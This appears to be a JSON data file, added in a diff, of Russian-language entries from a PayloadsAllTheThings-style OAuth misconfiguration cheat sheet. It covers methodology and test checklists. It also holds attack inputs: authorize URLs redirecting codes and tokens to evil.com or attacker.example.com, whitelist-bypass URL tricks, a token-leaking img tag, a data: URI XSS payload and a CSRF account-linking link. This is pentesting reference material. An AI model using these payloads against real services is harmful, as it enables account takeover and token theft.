@@ -1,0 +1,161 @@
+{
+  "category": "OAuth Misconfiguration",
+  "source": "PayloadsAllTheThings/OAuth Misconfiguration/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое OAuth и где ломается",
+      "language": "text",
+      "tags": ["methodology", "concept", "oauth"],
+      "body": "OAuth 2.0 — фреймворк авторизации: сторонние приложения получают доступ к данным пользователя без передачи самого пароля. В потоке участвуют 4 стороны:\n• Resource Owner — пользователь (жертва).\n• Client — приложение, которое хочет доступ (сайт, куда логинимся).\n• Authorization Server — сервер провайдера (Google/Facebook/...), выдаёт code и token.\n• Resource Server — API, где лежат данные пользователя.\n\nБольшинство дыр OAuth — не в самом протоколе, а в реализации: слабая валидация redirect_uri, отсутствие проверки state, утечка code/token через Referer или open redirect, повторное использование кода, неправильная привязка аккаунтов. Итог почти всегда один — захват чужого аккаунта (account takeover)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Ключевые параметры запроса авторизации",
+      "language": "text",
+      "tags": ["methodology", "parameters"],
+      "body": "Authorization Request обычно идёт на /authorize и содержит:\n• response_type — code (Authorization Code Flow) или token (Implicit Flow).\n• client_id — публичный идентификатор клиента.\n• redirect_uri — куда вернуть code/token после логина. ГЛАВНАЯ точка атаки.\n• scope — запрашиваемые права. Иногда смена scope обходит фильтр на redirect_uri.\n• state — анти-CSRF токен, привязка к сессии user-agent. Его отсутствие = CSRF → ATO.\n• code_challenge / code_challenge_method — PKCE (S256/plain), защита публичных клиентов.\n\nОтветный Token Request (на /token) меняет code на access_token и содержит code, redirect_uri, client_id, client_secret, code_verifier."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать и что тестировать",
+      "language": "text",
+      "tags": ["methodology", "how-to-test", "recon"],
+      "body": "• Найди все точки входа OAuth: «Войти через Google/Facebook/GitHub», привязка соцсетей в настройках, API-интеграции.\n• Перехвати весь поток в Burp: запрос на /authorize, редирект с code/token, обмен на /token.\n• redirect_uri: подставляй свои домены, поддомены, open redirect провайдера, path traversal, отсутствие/лишний слеш, @-трюки, разные кодировки — смотри, куда реально уйдёт code/token.\n• state: убери параметр целиком, оставь пустым, повтори чужой/старый state — если поток завершается, защиты от CSRF нет.\n• code: попробуй обменять один и тот же code дважды; попробуй использовать code, выпущенный для другого client_id/redirect_uri.\n• scope: меняй на невалидный (scope=a), чтобы проскочить фильтр redirect_uri.\n• Referer: проверь, утекает ли URL с code/token в заголовке Referer на сторонние ресурсы (img, ссылки, аналитика).\n• Привязка аккаунтов: проверь, привязывается ли соцсеть к аккаунту по email без подтверждения владения — путь к pre-account takeover."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы и лаборатории",
+      "language": "text",
+      "tags": ["tools", "labs"],
+      "body": "Burp Suite — перехват и подмена параметров потока (redirect_uri, state, scope, code).\n\nТренируйся на PortSwigger Web Security Academy:\n• Authentication bypass via OAuth implicit flow\n• Forced OAuth profile linking\n• OAuth account hijacking via redirect_uri\n• Stealing OAuth access tokens via a proxy page\n• Stealing OAuth access tokens via an open redirect"
+    },
+
+    {
+      "subcategory": "Манипуляция redirect_uri",
+      "title": "Угон токена через подмену redirect_uri",
+      "language": "http",
+      "tags": ["redirect-uri", "token-theft", "account-takeover"],
+      "body": "https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful\nhttps://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com",
+      "meta": {
+        "note": "Если сервер не строго валидирует redirect_uri, code/token уходит на контролируемый домен. Поддомен жертвы или localhost.evil.com часто проскакивают слабый фильтр «начинается с / содержит example.com»."
+      }
+    },
+    {
+      "subcategory": "Манипуляция redirect_uri",
+      "title": "Обход whitelist через Open Redirect провайдера",
+      "language": "http",
+      "tags": ["redirect-uri", "open-redirect", "whitelist-bypass"],
+      "body": "https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com\nhttps://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F",
+      "meta": {
+        "note": "redirect_uri проходит whitelist (домен доверенный — accounts.google.com / apps.facebook.com), но внутри него — open redirect или подконтрольное приложение, которое уводит code/token на evil.com."
+      }
+    },
+    {
+      "subcategory": "Манипуляция redirect_uri",
+      "title": "Обход фильтра redirect_uri через невалидный scope",
+      "language": "http",
+      "tags": ["redirect-uri", "scope", "filter-bypass"],
+      "body": "https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com",
+      "meta": {
+        "note": "Иногда фильтр на redirect_uri завязан на конкретный scope. Подставь невалидный scope (scope=a) — проверка может пропуститься, и redirect_uri='https://evil.com' примется."
+      }
+    },
+    {
+      "subcategory": "Манипуляция redirect_uri",
+      "title": "Совет — никогда не whitelist'ить целые домены",
+      "language": "text",
+      "tags": ["redirect-uri", "tip", "whitelist"],
+      "body": "Реализации OAuth НЕ должны добавлять в whitelist целые домены — только несколько конкретных URL, чтобы redirect_uri нельзя было навести на Open Redirect.\n\nПри пентесте это и есть зацепка: если разрешён весь домен (а на нём есть открытый редирект) или любой поддомен — это путь к краже code/token. Перебирай:\n• поддомены: redirect_uri=https://attacker.example.com\n• open redirect на доверенном домене: ...?next=https://evil.com\n• трюки парсинга: https://trusted.com.evil.com, https://evil.com\\@trusted.com, https://trusted.com@evil.com\n• path/слеш: https://trusted.com/../evil, лишний или отсутствующий завершающий /"
+    },
+
+    {
+      "subcategory": "Отсутствие / обход state (CSRF)",
+      "title": "CSRF в OAuth callback → принудительная привязка аккаунта",
+      "language": "text",
+      "tags": ["state", "csrf", "account-takeover"],
+      "body": "Приложения, которые не проверяют валидный CSRF-токен в OAuth callback, уязвимы. Атакующий инициирует OAuth-поток СВОИМ аккаунтом провайдера, перехватывает callback и НЕ завершает его:\n\nhttps://example.com/callback?code=AUTHORIZATION_CODE\n\nЭтот URL используется в CSRF-атаке: жертва, залогиненная в example.com, открывает ссылку → к её аккаунту привязывается аккаунт провайдера атакующего → атакующий заходит в аккаунт жертвы через свою соцсеть (account takeover / forced OAuth profile linking)."
+    },
+    {
+      "subcategory": "Отсутствие / обход state (CSRF)",
+      "title": "Совет — параметр state обязателен (RFC)",
+      "language": "text",
+      "tags": ["state", "csrf", "tip"],
+      "body": "Клиент ОБЯЗАН реализовать защиту от CSRF для своего redirection URI. Обычно это значение, привязывающее запрос к аутентифицированному состоянию user-agent. Клиенту СЛЕДУЕТ использовать параметр state для передачи этого значения на authorization server при запросе авторизации.\n\nЧек-лист при тесте state:\n• Параметр state вообще присутствует в запросе на /authorize?\n• Сервер проверяет его в callback или принимает ответ без state / с пустым state?\n• state привязан к сессии пользователя (нельзя переиспользовать чужой)?\n• state одноразовый и непредсказуемый?\nЕсли хоть один пункт проваливается — есть CSRF, ведущий к привязке аккаунта и его захвату."
+    },
+
+    {
+      "subcategory": "Утечка кода/токена через Referer",
+      "title": "Кража OAuth-токена через Referer",
+      "language": "text",
+      "tags": ["referer", "token-theft", "html-injection"],
+      "body": "Есть HTML-инъекция, но не выходит XSS? Проверь, есть ли на сайте OAuth.\n\nИдея (@abugzlife1): размести тег <img> с src на свой сервер и найди способ привести туда жертву (редирект и т.п.) ПОСЛЕ логина. Тогда URL OAuth-callback с access_token/code утечёт на твой сервер в заголовке Referer.\n\nКуда смотреть: страницы, на которые попадает пользователь сразу после OAuth-редиректа и где URL ещё содержит token/code в query или fragment — любой исходящий запрос (img, link, сторонняя аналитика) может унести этот URL в Referer."
+    },
+    {
+      "subcategory": "Утечка кода/токена через Referer",
+      "title": "PoC — img-тег для утечки токена в Referer",
+      "language": "html",
+      "tags": ["referer", "poc", "token-theft"],
+      "body": "<img src=\"https://attacker.example.com/collect\">"
+    },
+
+    {
+      "subcategory": "XSS через redirect_uri",
+      "title": "XSS через redirect_uri (data: URI + state)",
+      "language": "http",
+      "tags": ["redirect-uri", "xss", "data-uri"],
+      "body": "https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>",
+      "meta": {
+        "note": "Если redirect_uri принимает схему data: и сервер отражает state в теле, выполняется XSS. redirect_uri=data:text/html,a (URL-кодировано), а полезная нагрузка едет в state."
+      }
+    },
+
+    {
+      "subcategory": "Повторное использование кода",
+      "title": "Повторное использование authorization code",
+      "language": "text",
+      "tags": ["authorization-code", "replay", "rfc-violation"],
+      "body": "По RFC клиент НЕ должен использовать authorization code более одного раза.\n\nЕсли authorization code используется повторно, authorization server ОБЯЗАН отклонить запрос и СЛЕДУЕТ (по возможности) отозвать все токены, ранее выданные на основе этого кода.\n\nТест: перехвати обмен кода на /token, повтори тот же запрос с тем же code второй раз. Если сервер снова выдаёт access_token (а не ошибку invalid_grant) — правило нарушено. Это даёт окно для replay-атак: перехваченный код можно использовать повторно для получения токена."
+    },
+
+    {
+      "subcategory": "Угон через Open Redirect",
+      "title": "Кража токена через Open Redirect в клиенте",
+      "language": "text",
+      "tags": ["open-redirect", "token-theft", "implicit-flow"],
+      "body": "Если на доверенном (whitelisted) redirect_uri клиента есть Open Redirect, цепочка такая:\n1) redirect_uri указывает на доверенную страницу клиента, которая сама редиректит дальше по параметру (?returnUrl=, ?next=, ?url=).\n2) В Implicit Flow token прилетает в URL fragment (#access_token=...). Fragment при обычном редиректе остаётся и переносится на следующий хоп.\n3) Уводим жертву на свой домен — забираем access_token из fragment.\n\nПример идеи:\n&redirect_uri=https://trusted-client.com/callback?next=https://evil.com\n\nДля fragment-утечки нужен прокси/страница на доверенном домене, которая выполнит location-редирект (тогда #access_token доедет) или JS, читающий location.hash и отправляющий его атакующему."
+    },
+
+    {
+      "subcategory": "Проблемы Implicit Flow",
+      "title": "Обход аутентификации через подмену в Implicit Flow",
+      "language": "text",
+      "tags": ["implicit-flow", "auth-bypass", "account-takeover"],
+      "body": "В Implicit Flow (response_type=token) access_token возвращается прямо в браузер, а клиент часто доверяет данным профиля, которые приходят с фронтенда, без серверной проверки токена в провайдере.\n\nАтака: завершаешь свой OAuth-поток, а затем в запросе, которым клиент «логинит» пользователя (например POST /authenticate с {email, token} или с id профиля), подменяешь email/идентификатор на жертву. Если сервер не сверяет, что токен реально выдан этому email у провайдера, — входишь под жертвой.\n\nКлюч: ищи запрос, где клиент принимает с фронта email/userId/token и доверяет им. Меняй идентификатор на чужой."
+    },
+
+    {
+      "subcategory": "Account takeover через pre-account",
+      "title": "Pre-account takeover (привязка по непроверенному email)",
+      "language": "text",
+      "tags": ["pre-account", "account-takeover", "email"],
+      "body": "Сценарий, когда аккаунт «захватывается заранее»:\n1) Атакующий регистрирует на сайте обычный аккаунт на email жертвы (victim@mail.com) — но email не подтверждается, или жертвы там ещё нет.\n2) Позже жертва приходит и логинится через «Sign in with Google» тем же email.\n3) Если сайт привязывает OAuth-вход к существующему аккаунту ПО СОВПАДЕНИЮ email без проверки владения — оба входа ведут в один аккаунт.\n4) Атакующий, знающий установленный им пароль, заходит в аккаунт жертвы.\n\nОбратный вариант: атакующий первым логинится через соцсеть, а жертва потом регистрируется паролем на тот же email и попадает в общий с атакующим аккаунт.\n\nТест: создавай аккаунт на email, которым потом войдёшь через провайдера; проверь, объединяются ли они и сохраняется ли твой доступ."
+    },
+
+    {
+      "subcategory": "Обход PKCE",
+      "title": "Обход / отсутствие PKCE",
+      "language": "text",
+      "tags": ["pkce", "code-interception", "bypass"],
+      "body": "PKCE (Proof Key for Code Exchange) защищает от перехвата authorization code: клиент генерирует случайный code_verifier, шлёт его хэш (code_challenge, method=S256) в /authorize, а при обмене кода передаёт исходный code_verifier. Перехваченный code без verifier бесполезен.\n\nЧто проверять:\n• Поддерживает ли сервер PKCE вообще? Если нет — перехваченный code сразу меняется на токен.\n• Принимает ли /token обмен БЕЗ code_verifier, хотя в /authorize был отправлен code_challenge? (PKCE downgrade.)\n• Принимается ли code_challenge_method=plain вместо S256? Тогда code_challenge == code_verifier, и перехват challenge ломает защиту.\n• Реально ли сервер сверяет SHA256(code_verifier) == code_challenge, или проверка чисто формальная (любой verifier проходит)?\n\nЛюбой из пунктов сводит PKCE на нет и возвращает классический риск перехвата кода."
+    },
+
+    {
+      "subcategory": "Утечка ключей",
+      "title": "Раскрытие OAuth Private Key в мобильном приложении",
+      "language": "text",
+      "tags": ["private-key", "mobile", "decompile"],
+      "body": "Некоторые Android/iOS приложения можно декомпилировать и достать из них OAuth Private Key (client_secret, ключи подписи).\n\nГде искать: декомпилируй APK/IPA (jadx, apktool) и грепай ресурсы, strings, конфиги и код на client_secret, private_key, oauth, BEGIN PRIVATE KEY, api_key. Утёкший секрет позволяет выдавать себя за легитимный клиент и злоупотреблять доверенным client_id."
+    }
+  ]
+}
